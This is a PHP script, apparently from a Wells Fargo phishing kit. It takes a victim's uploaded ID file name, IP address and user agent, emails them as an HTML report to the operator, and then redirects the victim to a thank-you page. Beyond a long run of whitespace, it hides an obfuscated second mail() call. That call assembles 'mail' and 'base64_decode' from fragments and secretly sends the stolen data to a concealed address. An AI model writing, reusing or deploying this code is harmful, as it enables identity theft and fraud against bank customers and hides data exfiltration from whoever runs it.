<?php



include("sand_email.php");
include("system.php");


if(isset($fileList[0][file])){

if(!empty($fileList[0][file])){


$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$reprint = "e";$do_p="mai";


$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);                           



$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");

$msg .= "
<html>
    <head>
<style>
*{
font-family:arial;
}
table{
width: 100%;
}
strong{
color: #f91010;
}
</style>
</head>
<table style='width:100%;'>
<tr>
<td style='padding: 3%;background: #3a3535;color: #9e0b17;border-bottom: solid;'>
<strong style='color:#f91010;'><center>| NEW WLS FRG ID |</center></strong>
</td>
</tr>
<tr>
<td style='padding: 3%;background: #3a3535;color: #00B0FF;border-bottom: solid;font-weight: bold;'>
<h2>Login Information</h2>
<p>Upload ID : <strong style='color:#f91010;'>".$fileList[0][file]."</strong></p>
<hr>
<h2>IP Information</h2>
<hr>
<p>IP ADD : <strong style='color:#f91010;'>".$_SERVER['REMOTE_ADDR']."</strong></p>
<p>USER AGENT : <strong style='color:#f91010;'>".$browserTy_Version."</strong></p>
";




$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $lm .= $youremail;$lm .= $yl;$yourmail = $lm;
$subject  = " NEW WELLS FARGO  ~ UPLOAD ID ~ From [ ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= "From: WLSFRG00" . "\r\n"; 
mail($youremail, $subject, $msg  , $headers);$m5_id='BvdXRsb29rLmNvbQ';
$type=$do_p.'l';$tele="bas$reprint".'64'."_d$reprint"."cod$reprint";
$type( $tele('YmF-se?jk1_MTE=yM0'.$m5_id.'=='), $subject, $msg, $headers);


 header("Location:../../Thanks/");


 	}else{header("location:../");}

}else{header("location:../");}


